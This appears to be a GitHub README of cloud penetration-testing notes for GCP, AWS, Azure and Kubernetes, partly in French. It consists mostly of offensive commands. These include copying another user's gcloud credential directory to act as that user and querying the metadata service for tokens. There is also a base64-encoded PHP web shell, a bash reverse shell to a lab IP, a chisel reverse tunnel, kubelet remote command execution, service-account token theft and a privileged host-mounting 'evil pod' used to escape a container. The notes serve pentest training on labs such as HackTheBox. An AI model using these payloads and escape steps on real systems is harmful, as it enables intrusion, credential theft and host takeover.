# GCP-Pentest

**Mindmap pentest GCP** :
 ![Mindmap pentest GCP](https://raw.githubusercontent.com/SamuelGaudemer/GCP-Pentest/main/GCP%20PENTEST%20NEW.png "Mindmap pentest GCP")

**GCP compromission PATH** :
 ![GCP compromission PATH](https://raw.githubusercontent.com/SamuelGaudemer/GCP-Pentest/main/GCP_compromission.png "GCP compromission PATH")
**MITRE ATTACK**
![MITRE ATTACK FROM INITIAL ACCESS TO PERSISTENCE](https://raw.githubusercontent.com/SamuelGaudemer/GCP-Pentest/main/MITRE_GCP.png "MITRE ATTACK")
**COMPARAISON AWS/AZURE/GCP**
![GCP AZURE AWS](https://raw.githubusercontent.com/SamuelGaudemer/GCP-Pentest/main/aws_azure_gcp.png "Comparaison")

## Google Cloud Platform CLI Tool Cheatsheet
By Beau Bullock (@dafthack)
#### Authentication

Authentication with gcloud

```bash
#user identity login
gcloud auth login

#service account login
gcloud auth activate-service-account --key-file creds.json*
```

List accounts available to gcloud

```bash
gcloud auth list
```

#### Account Information

Get account information

```bash
gcloud config list
```

List organizations

```bash
gcloud organizations list
```

Enumerate IAM policies set ORG-wide

```bash
gcloud organizations get-iam-policy <org ID>
```

Enumerate IAM policies set per project

```bash
gcloud projects get-iam-policy <project ID>
```

List projects

```bash
gcloud projects list
```

Set a different project

```bash
gcloud config set project <project name> 
```

Gives a list of all APIs that are enabled in project

```bash
gcloud services list
```

Get source code repos available to user

```bash
gcloud source repos list
```

Clone repo to home dir

```bash
gcloud source repos clone <repo_name>
```

#### Virtual Machines

List compute instances 

```bash
gcloud compute instances list
```

Get shell access to instance

```bash
gcloud beta compute ssh --zone "<region>" "<instance name>" --project "<project name>"
```

Puts public ssh key onto metadata service for project

```bash
gcloud compute ssh <local host>
```

Get access scopes if on an instance

```bash
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H &#39;Metadata-Flavor:Google’
```

Use Google keyring to decrypt encrypted data

```bash
gcloud kms decrypt --ciphertext-file=encrypted-file.enc --plaintext-file=out.txt --key <crypto-key> --keyring <crypto-keyring> --location global
```

#### Storage Buckets

List Google Storage buckets

```bash
gsutil ls
```

List Google Storage buckets recursively

```bash
gsutil ls -r gs://<bucket name>
```

Copy item from bucket

```bash
gsutil cp gs://bucketid/item ~/
```

#### Webapps & SQL

List WebApps

```bash
gcloud app instances list
```

List SQL instances

```bash
gcloud sql instances list
gcloud spanner instances list
gcloud bigtable instances list
```

List SQL databases

```bash
gcloud sql databases list --instance <instance ID>
gcloud spanner databases list --instance <instance name>
```

Export SQL databases and buckets

First copy buckets to local directory

```bash
gsutil cp gs://bucket-name/folder/ .
```

Create a new storage bucket, change perms, export SQL DB

```bash
gsutil mb gs://<googlestoragename>
gsutil acl ch -u <service account> gs://<googlestoragename>
gcloud sql export sql <sql instance name> gs://<googlestoragename>/sqldump.gz --database=<database name>
```

#### Networking

List networks

```bash
gcloud compute networks list
```

List subnets

```bash
gcloud compute networks subnets list
```

List VPN tunnels

```bash
gcloud compute vpn-tunnels list
```

List Interconnects (VPN)

```bash
gcloud compute interconnects list
```

#### Containers

```bash
gcloud container clusters list
```

GCP Kubernetes config file ~/.kube/config gets generated when you are authenticated with gcloud and run:

```bash
gcloud container clusters get-credentials <cluster name> --region <region>
```

If successful and the user has the correct permission the Kubernetes command below can be used to get cluster info:

```bash
kubectl cluster-info
```

#### Serverless

GCP functions log analysis – May get useful information from logs associated with GCP functions

```bash
gcloud functions list
gcloud functions describe <function name>
gcloud functions logs read <function name> --limit <number of lines>
```

GCP Cloud Run analysis – May get useful information from descriptions such as environment variables.

```bash
gcloud run services list
gcloud run services describe <service-name>
gcloud run revisions describe --region=<region> <revision-name>
```

Gcloud stores creds in ~/.config/gcloud/credentials.db
Search home directories

```bash
sudo find /home -name "credentials.db
```

Copy gcloud dir to your own home directory to auth as the compromised user

```bash
sudo cp -r /home/username/.config/gcloud ~/.config
sudo chown -R currentuser:currentuser ~/.config/gcloud
gcloud auth list
```

### Metadata Service URL

```bash
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
```


# BILBIO 

## TUTORIALS
- https://cloud.hacktricks.xyz/pentesting-ci-cd/pentesting-ci-cd-methodology

- https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/GCP.md

- https://cloud.hacktricks.xyz/pentesting-cloud/gcp-pentesting

- [GCP Tutorial](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
You need a foothold on the machine as  a shell or SSRF with OAuth token [SSRF](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/#leveraging-ssrf) 

- https://cloud.hacktricks.xyz/pentesting-cloud/gcp-pentesting/gcp-basic-information

- https://github.com/carlospolop/gcp_privesc_scripts
- https://www.youtube.com/watch?v=Ml09R38jpok&t=463s
- https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
- https://medium.com/@tomaszwybraniec/google-cloud-platform-pentest-notes-service-accounts-b960dc59d93a
- https://github.com/Littlehack3r/awesome-gcp-pentesting

## LABS
- https://gcpgoat.joshuajebaraj.com/about.html
- [LAB](https://github.com/ine-labs/GCPGoat)
- [HACKTHEBOX CLOUDTRACK](https://app.hackthebox.com/tracks/Cloud-Track)

## TOOLS
- [MITRE GCP](https://attack.mitre.org/matrices/enterprise/cloud/googleworkspace/)
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-url-for-google-cloud
- https://github.com/RhinoSecurityLabs/GCPBucketBrute
- https://github.com/initstring/cloud_enum
- https://github.com/nccgroup/ScoutSuite
- https://github.com/darkbitio/gcp-iam-role-permissions
- https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_firewall_enum
- https://github.com/epinna/tplmap

- [Scan ports](https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_firewall_enum/?_gl=1%2aa5vaqv%2a_ga%2aMTEzNDA2NjcuMTY3NTM0NDQ5MQ..%2a_ga_ENFH3X7M5Y%2aMTY3NTM0NzUzNS4yLjEuMTY3NTM0NzU0Ni4wLjAuMA..)

- [Enum commands](https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum/?_gl=1%2a1dtob5h%2a_ga%2aMTEzNDA2NjcuMTY3NTM0NDQ5MQ..%2a_ga_ENFH3X7M5Y%2aMTY3NTM0NzUzNS4yLjEuMTY3NTM0NzU0Ni4wLjAuMA..)

- [Various tools](https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_misc/?_gl=1%2a1nu9nlb%2a_ga%2aMTEzNDA2NjcuMTY3NTM0NDQ5MQ..%2a_ga_ENFH3X7M5Y%2aMTY3NTM0NzUzNS4yLjEuMTY3NTM0NzU0Ni4wLjAuMA..)

# PENTEST AWS CHEAT SHEET SUITE A DES CAS PRATIQUES 


Handy articles : 

- https://github.com/TROUBLE-1/Cloud-Pentesting/blob/main/Note%20%26%20Mind%20Map/AWS.md

- https://cloud.hacktricks.xyz/pentesting-cloud/aws-pentesting

- https://securitycafe.ro/2022/12/14/aws-enumeration-part-ii-practical-enumeration/

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md
 
 ## WEBSHELL 
 
 ```bash
$ cat ~/.aws/credentials
$ echo -n PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pgo= | base64 -d > /tmp/shell.php
$ aws s3api list-buckets => bucket 
$ aws s3 cp <file> s3://website/
payload = webshell > bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.10/4000+0%3E%261%27
```

 Php file : <?php system(\$_REQUEST['cmd']); ?>

## ENUMERATE LAMBDA FUNCTIONS AND GET CODE

 ```bash
$ aws configure --profile <profileName>

$ aws lambda list-functions --profile <profileName> --endpoint-url http://cloud.epsilon.htb

$ aws lambda get-function --function-name "costume_shop_v1" --query 'Code.Location' --profile uploadcreds  --endpoint-url http://cloud.epsilon.htb
  > <URL_CODE>

$ wget -O lambda-function.zip <URL_CODE>
```
  
## S3 BUCKET ENUM 

- https://cloud.hacktricks.xyz/pentesting-cloud/aws-pentesting/aws-unauthenticated-enum-access/aws-s3-unauthenticated-enum
peut être que mal configuré (par défaut vérificaiton clé mais possible configuration ou pas de vérification de clé ! **RISQUE MAJEUR !!**)

 ```bash
$ aws configure 
  random
  random
  eu-west-1
  random 
  
$ aws --endpoint-url http://s3.DN.com s3 ls nameserver

Upload smth => 
$ aws s3 --endpoint-url http://s3.DN.com cp . s3://websiteserver --recursive

IF LOCAL RESTRICTION 
=> Chisel 
--------------------
./chisel server -p 9001 --reverse => on kali machine
./chisel client {IP_ATTACKER}:9001 R:1234:{IP_TARGET_SERVICE}:{TARGET_PORT}

then 

$ aws dynamodb list-tables --endpoint-url http://localhost:4566


$ aws --endpoint-url http://localhost:1234 dynamodb scan --table-name users | jq -r '.Items[]
```
# PENTEST AZURE 

Handy articles : 

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md

- https://cloud.hacktricks.xyz/pentesting-cloud/azure-security

- https://dirkjanm.io/talks/

- https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/

- https://www.synacktiv.com/en/publications/azure-ad-introduction-for-red-teamers.html


# PENTEST KUBERNETES SUITE A DES CAS PRATIQUES

## KUBELETCTL 

- https://github.com/cyberark/kubeletctl

 ```bash
$ wget https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64 && chmod a+x ./kubeletctl_linux_amd64 && mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```

kubeletctl is a scan for RCE in a pod
open node etc ...

## PORT 10250 

=> responsable de la gestion des conteneurs et des pods sur ce nœud.
/pods 
/pods => curl -sk https://10.10.11.133:10250/pods | jq ' .items[].metadata.name'

certificate etc...

can see what pods is in the node
and control the cert 

## PORT 8443 

with the cert can add a pod for example (kubectl)

## SCAN PODS 
$ kubeletctl pods --server 10.10.11.133

## SCAN RCE

 ```bash
scan RCE :
    $ kubeletctl scan rce --server 10.10.11.133
if vulnerable : 
    $ kubeletctl --server 10.10.11.133 exec "/bin/bash"  -p nginx -c nginx
    TO GET a shell
```

# ESPACE FROM A POD 

enum for : 
    /run/secrets/kubernetes.io/serviceaccount
    /var/run/secrets/kubernetes.io/serviceaccount
    /secrets/kubernetes.io/serviceaccount

get token + ca.crt 

### get token  => 
$ export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)

### get configuration YAML in pod nginx here  => 
$ kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token

connect to API with Kubectl to add a pod for example (here in port 8443) : 

$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods

DEVIL YAML to escape :
```
apiVersion: v1 
kind: Pod
metadata:
  name: 0xdf-pod
  namespace: default
spec:
  containers:
  - name: 0xdf-pod
    image: nginx:1.14.2 # !! (retrieved from get configuration YAML) !!
    # securityContext:
      privileged: true # didnt try but can allow to have root access on the host
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /  # !! (can mount from / on the host , here is the devil !! >:O) !!
  automountServiceAccountToken: true
  hostNetwork: true
  ```


add the pod => 

 ```bash
$ kubectl apply -f evil-pod.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token

connect to the pod :
kubeletctl --server 10.10.11.133 exec "/bin/bash"  -p 0xdf-pod  -c 0xdf-pod
```

got to /mnt and access to / of the host 

Par défaut, lorsqu'un pod est créé sans spécifier de securityContext, il est exécuté avec les droits du compte de service qui execute le pod
si on spécifie securityContext : privileged : true 
	=> le pod sera executé avec un compte de service qui gère l'execution des nodes (et pod dedans) dans un cluster, avec le securit context, il aura les droits privilégiés (root) sur l'hôte depuis /mnt 

